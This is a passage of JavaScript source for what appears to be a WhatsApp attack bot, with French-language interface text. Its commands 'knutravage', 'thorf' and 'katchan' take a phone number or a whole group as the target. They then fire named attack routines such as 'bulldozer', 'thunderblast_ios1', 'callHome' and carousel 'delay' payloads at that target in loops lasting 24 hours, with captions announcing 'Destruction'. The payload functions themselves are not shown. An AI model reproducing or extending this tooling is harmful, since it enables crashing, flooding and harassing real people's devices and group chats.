✔ Vortex stabilisé

🧊 État final : STABLE
╚════════════════════════╝`
      }, { quoted: msg });

    } catch (err) {
      console.error("Erreur XKNUT:", err);
      await sock.sendMessage(from, { text: `⚠️ 𝗫𝗞𝗡𝗨𝗧 – 𝗜𝗡𝗧𝗘𝗥𝗥𝗨𝗣𝗧𝗜𝗢𝗡` }, { quoted: msg });
    }
  },
};

// ────────────────────────────────────────────────

const knutravage = {
  name: "knutravage",
  execute: async (sock, msg, args, from) => {
    if (!msg.key.remoteJid.endsWith("@g.us")) {
      return sock.sendMessage(from, {
        text: `╔═══❖ KNUTRAVAGE ❖═══╗
❌ Groupe requis uniquement
╚═══════════════════╝`
      }, { quoted: msg });
    }

    const target = from;

    await sock.sendMessage(from, {
      image: { url: "https://files.catbox.moe/x2hle6.jpg" },
      caption: `╭━〔 🔥𝗞𝗡𝗨𝗧𝗥𝗔𝗩𝗔𝗚𝗘:𝗜𝗡𝗜𝗧𝗜𝗔𝗧𝗜𝗢𝗡 〕━╮
◈ Cible    : Groupe entier
◈ Mode     : Destruction
◈ Durée    : 24 Heures
◈ Sécurité : Anti‑Spam Actif

❄️ Stabilisation en cours…
╰━━━━━━━━━━━━━━━━━━━━━━━━━╯`
    }, { quoted: msg });

    const START = Date.now();
    const DURATION = 24 * 60 * 60 * 1000;
    const ACTION_INTERVAL = 5 * 60 * 1000;
    const MAX_PER_HOUR = 12;

    let hourCount = 0;
    let hourStart = Date.now();

    try {
      // Burst initial
      await apaya(sock, target);
      await alldelay(sock, target);
      await bulldozer(sock, target);
      await allProtocol(sock, target);
      await thunderblast_ios1(sock, target);

      while (Date.now() - START < DURATION) {
        if (Date.now() - hourStart >= 60 * 60 * 1000) {
          hourCount = 0;
          hourStart = Date.now();
        }

        if (hourCount < MAX_PER_HOUR) {
          await carouselDelay(sock, target);
          await carouselDelay(sock, target);
          await thunderblast_ios1(sock, target);
          hourCount += 3;
        }

        await new Promise(r => setTimeout(r, ACTION_INTERVAL));
      }

      await sock.sendMessage(from, {
        text: `╔═══❖ 𝗞𝗡𝗨𝗧𝗥𝗔𝗩𝗔𝗚𝗘 𝗥𝗘𝗣𝗢𝗥𝗧 ❖═══╗
✔ Cycle 24H complété
✔ Destruction contenue

🧊 État final : STABLE
╚════════════════════════════╝`
      }, { quoted: msg });

    } catch (err) {
      console.error("Erreur KNUTRAVAGE:", err);
      await sock.sendMessage(from, { text: `⚠️ 𝗞𝗡𝗨𝗧𝗥𝗔𝗩𝗔𝗚𝗘 – 𝗜𝗡𝗧𝗘𝗥𝗥𝗨𝗣𝗧𝗜𝗢𝗡` }, { quoted: msg });
    }
  },
};

const thorf = {
  name: "thorf",
  execute: async (sock, msg, args, from) => {
    if (!args[0]) {
      return sock.sendMessage(from, {
        text: `╔═══❖ THORF ❖═══╗
➤ Syntaxe correcte :
   thorf 237XXXXXXXX
╚════════════════╝`
      }, { quoted: msg });
    }

    const number = args[0].replace(/[^0-9]/g, "");
    const target = number + "@s.whatsapp.net";

    await sock.sendMessage(from, {
      image: { url: "https://files.catbox.moe/u0ev83.jpg" },
      caption: `╭━〔 ⚡𝗧𝗛𝗢𝗥𝗙:𝗜𝗡𝗜𝗧𝗜𝗔𝗧𝗜𝗢𝗡 〕━╮
◈ Cible    : ${number}
◈ Mode     : Foudre divine
◈ Durée    : 24 Heures
◈ Sécurité : Anti‑Spam Actif (limité)

❄️ Tonnerre en approche…
╰━━━━━━━━━━━━━━━━━━━━━━━━━━━╯`
    }, { quoted: msg });

    try {
      await bulldozer(sock, target);
      await allProtocol(sock, target);
      await thunderblast_ios1(sock, target);
      await callHome(sock, target);
      await apaya(sock, target);
      await alldelay(sock, target);
      await CarouselX(sock, target);

      const startTime = Date.now();

      while (Date.now() - startTime < 24 * 60 * 60 * 1000) {
        const hourStart = Date.now();
        let hourCount = 0;

        while (Date.now() - hourStart < 60 * 60 * 1000 && hourCount < 10) {
          await carouselDelay(sock, target);
          await thunderblast_ios1(sock, target);
          await bulldozer(sock, target);
          hourCount += 3;
          await new Promise(r => setTimeout(r, 5 * 60 * 1000));
        }
      }

      await sock.sendMessage(from, {
        text: `╔═══❖ 𝗧𝗛𝗢𝗥𝗙 𝗥𝗘𝗣𝗢𝗥𝗧 ❖═══╗
✔ Cycle 24H terminé
✔ Foudre contenue

🧊 État final : STABLE (par miracle)
╚══════════════════════════════╝`
      }, { quoted: msg });

    } catch (err) {
      console.error("Erreur THORF:", err);
      await sock.sendMessage(from, {
        text: `⚠️ 𝗧𝗛𝗢𝗥𝗙 – 𝗜𝗡𝗧𝗘𝗥𝗥𝗨𝗣𝗧𝗜𝗢𝗡`
      }, { quoted: msg });
    }
  },
};

const katchan = {
  name: "katchan",
  execute: async (sock, msg, args, from) => {
    if (!args[0]) {
      return sock.sendMessage(from, {
        text: `╔═══❖ KATCHAN ❖═══╗
❌ Cible obligatoire !
Syntaxe correcte :
   katchan 237XXXXXXXX

Doit être exécuté avec un numéro précis.
Pas d'exécution sans cible.
╚══════════════════════════════╝`
      }, { quoted: msg });
    }

    const number = args[0].replace(/[^0-9]/g, "");
    const target = number + "@s.whatsapp.net";

    await sock.sendMessage(from, {
      image: { url: "https://files.catbox.moe/a9j8tg.jpg" },
      caption: `╭━〔 🔥𝗞𝗔𝗧𝗖𝗛𝗔𝗡:𝗜𝗡𝗜𝗧𝗜𝗔𝗧𝗜𝗢𝗡 〕━╮
◈ Cible          : ${number}
◈ Mode           : Tout en même temps
◈ Durée          : 24 Heures
◈ Sécurité       : Anti‑Spam (limité)

❄️ Déclenchement total…
╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯`
    }, { quoted: msg });

    try {
      await Promise.all([
        apaya(sock, target),
        alldelay(sock, target),
        bulldozer(sock, target),
        allProtocol(sock, target),
        thunderblast_ios1(sock, target),
        callHome(sock, target),
        carousels2(sock, target),
        CarouselX(sock, target),
        carouselDelay(sock, target)
      ]);

      await sock.sendMessage(from, {
        text: `🔥 KATCHAN burst lancé sur ${number}
◈ Toutes les fonctions simultanées
◈ Maintien en cours…`
      }, { quoted: msg });

      const startTime = Date.now();

      while (Date.now() - startTime < 24 * 60 * 60 * 1000) {
        const hourStart = Date.now();
        let hourCount = 0;

        while (Date.now() - hourStart < 60 * 60 * 1000 && hourCount < 20) {
          await Promise.all([
            carouselDelay(sock, target),
            carouselDelay(sock, target),
            thunderblast_ios1(sock, target),
            apaya(sock, target)
          ]);
          hourCount += 4;
          await new Promise(r => setTimeout(r, 3 * 60 * 1000));
        }
      }

      await sock.sendMessage(from, {
        text: `╔═══❖ 𝗞𝗔𝗧𝗖𝗛𝗔𝗡 𝗥𝗘𝗣𝗢𝗥𝗧 ❖═══╗
✔ Cycle 24H terminé
✔ Tout envoyé simultanément
✔ Maintien fini

🧊 État final : STABLE
╚════════════════════════════════╝`
      }, { quoted: msg });

    } catch (err) {
      console.error("Erreur KATCHAN:", err);
      await sock.sendMessage(from, {
        text: `⚠️ 𝗞𝗔𝗧𝗖𝗛𝗔𝗡 – 𝗜𝗡𝗧𝗘𝗥𝗥𝗨𝗣𝗧𝗜𝗢𝗡
Erreur pendant le burst`
      }, { quoted: msg });
    }
  },
};
// ===================== EXPORT FINAL =====================
export default [
  bugmenu,
  crazy,
  thorf,
  katchan,
  carnage,
  ravage,
  xknut,
  knutravage
];